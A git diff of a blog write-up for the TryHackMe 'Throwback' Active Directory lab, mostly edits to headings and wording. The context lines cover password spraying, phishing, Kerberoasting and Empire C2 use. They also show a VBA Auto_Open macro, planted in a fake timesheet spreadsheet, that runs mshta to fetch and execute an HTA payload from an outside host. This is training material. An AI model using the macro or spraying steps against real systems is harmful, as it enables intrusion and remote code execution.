@@ -7,10 +7,13 @@ categories: thm
 
 ![throwback logo banner image](/assets/img/posts/throwback/banner.webp)
 
-[Throwback] in Active Directory lab that teaches the fundamentals and core concepts of attacking a Windows network. The network simulates a realistic corporate environment that has several attack vectors you would expect to find in today’s organisations.
+[Throwback] in Active Directory lab from **TryHackMe** that teaches the fundamentals and core concepts of attacking a Windows network. The network simulates a realistic corporate environment that has several attack vectors you would expect to find in today’s organisations.
 
 ## Contents
 ---
+
+I tried my really hard to organise this writeup, however with the nature of the lab I often needed to move to and from machines often, therefore it may jump around a little between topics and machines so use this contents list to find exactly what you need:
+
 1. [Network Enumeration](#enumeration)
 2. [THROWBACK-FW01](#throwback-fw01)
  - [Logging In](#logging-in)
@@ -18,21 +21,24 @@ categories: thm
  - [Credentials](#credentials)
  - [Flags](#fw01-flags)
 3. [THROWBACK-MAIL](#throwback-mail)
- - [Brute-forcing](#brute-forcing)
+ - [Password Spraying](#password-spraying-mail)
  - [Flags](#mail-flags)
 4. [THROWBACK WS01](#throwback-ws01)
  - [Phishing](#phishing)
  - [LLMNR Poisoning](#llmnr-poisoning)
- - [Flags](#ws01-flags)
  - [Kerberoasting](#kerberoasting)
+ - [Flags](#ws01-flags)
 5. [THROWBACK-PROD](#throwback-prod)
- - [Post Exploitation Framework](#post-exploitation-framework)
+ - [Post Exploitation](#post-exploitation)
  - [Enumeration](#enumeration-with-seatbelt)
  - [Privilege Escalation](#privilege-escalation)
  - [Dumping Hashes and Passwords](#dumping-hashes-and-passwords) 
  - [Flags](#prod-flags)
 6. [THROWBACK-TIME](#throwback-time)
+ - [Malicious Macro](#malicious-macro)
+ - [SQL Database](#sql-database)
 7. [THROWBACK-DC01](#throwback-dc01)
+ - [Password Spraying](#password-spraying-dc01)
 
 ## Enumeration
 ---
@@ -226,7 +232,7 @@ The address book contained a list of employee names and emails, which I compiled
 
 ![list of usernames and emails](/assets/img/posts/throwback/11_emails_and_usernames.webp)
 
-### Brute-forcing
+### Password Spraying MAIL
 
 I decided to use the username list and along with a small list of commonly used passwords to bruteforce the employee credentials.
 
@@ -248,7 +254,7 @@ And successfully found these users' passwords:
 
 ### MAIL Flags
 
-I found the first flag in the **Welcome** email in the inbox:
+I found the first flag in the "Welcome" email in guest the inbox:
 
 ![first flag](/assets/img/posts/throwback/9_flag1.webp)
 
@@ -256,7 +262,7 @@ And the second flag in the address book:
 
 ![second flag](/assets/img/posts/throwback/10_flag2.webp)
 
-## THROWBACK WS01
+# THROWBACK WS01
 ---
 
 ### Phishing
@@ -310,9 +316,9 @@ And successfully cracked PetersJ's password `Throwback317`:
 ## THROWBACK-PROD
 ---
 
-### Post Exploitation Framework
+### Post Exploitation
 
-Post exploitation, I used the [Empire](https://github.com/EmpireProject/Empire) framework as well as [Starkiller](https://github.com/BC-SECURITY/Starkiller), a front-end for it.
+Post exploitation, I used the [Empire](https://github.com/EmpireProject/Empire) framework as well as [Starkiller](https://github.com/BC-SECURITY/Starkiller), a front-end for it together as my C2 infrastructure.
 
 Very easily setup and ran with:
 ```shell
@@ -474,7 +480,7 @@ And the third in the description of one of the domain admins in BloodHound:
 ![domain admin with flag](/assets/img/posts/throwback/45_bloo
 dhound_flag.webp)
 
-# THROWBACK-TIME
+## THROWBACK-TIME
 ---
 
 My next target was the THROWBACK-TIME machine, a server used for employees to upload time keeping spreadsheets. To firstly access the web logon interface, I used [FoxyProxy]() - a web proxy - on the port 1080:
@@ -493,9 +499,9 @@ I then logged in to MurphyF's account to find Timesheet.xlsm upload form:
 
 So, I needed a way to use the Timesheet.xlsm to get a shell on the server.
 
-### Malcious VBA Macro
+### Malicious VBA Macro
 
-To do this, I wrote this VBA macro:
+To do this, I used this VBA macro:
 ```vba
 Sub macro()
     PID = Shell("mshta.exe http://10.50.27.129:8080/PGu0H7bw.hta")
@@ -506,7 +512,7 @@ Sub Auto_Open()
 End Sub
 ```
 
-And implanted it into a fake Timesheet.xlsm (macro enabled excel document) to upload:
+And saved it into a fake Timesheet.xlsm (macro enabled excel document) to upload:
 
 ![macro in excel](/assets/img/posts/throwback/52_macro.webp)
 
@@ -562,11 +568,12 @@ And the third was the root flag on the Administrators Desktop:
 
 ![time root flag](/assets/img/posts/throwback/64_timerootflag.webp)
 
-# THROWBACK-DC01
+## THROWBACK-DC01
 ---
 
-I then used this list of users in combination with the weak p
-assword list that I used to spray the mail server, to spray t
+### Password Spraying DC01
+
+I then used this list of users in combination with the weak password list that I used to spray the mail server, to spray t
 he Domain Controller (DC01) with crackmapexec:
 
 ```shell
